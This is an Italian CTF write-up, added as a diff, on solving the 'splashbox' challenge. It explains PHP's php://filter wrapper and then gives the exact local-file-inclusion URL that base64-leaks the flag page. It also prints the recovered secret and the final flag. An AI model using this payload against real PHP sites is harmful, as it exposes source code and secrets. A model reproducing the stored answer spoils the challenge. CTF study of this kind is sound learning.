@@ -1,0 +1,9 @@
+In ambito di sicurezza informatica e CTF, un PHP Filter è un meccanismo (chiamato "wrapper") che permette di manipolare un flusso di dati (stream) mentre viene letto o scritto.
+
+Il wrapper più utilizzato per gli attacchi è php://filter. Invece di far leggere a PHP un file normalmente, gli diciamo di applicare una trasformazione (un "filtro") al contenuto prima che ci venga consegnato.
+
+
+http://splashbox.challs.olicyber.it/?page=php://filter/convert.base64-encode/resource=flag usando questo mi da il secret e e poi andando su 
+http://splashbox.challs.olicyber.it/?page=flag&secret=69a606d6c503293b7b7c593fe2694224 mi esce la flag
+
+flag{f1ltr0_1nst4gr4m_3_c1t4z10n3_d1_Bibb0wski}
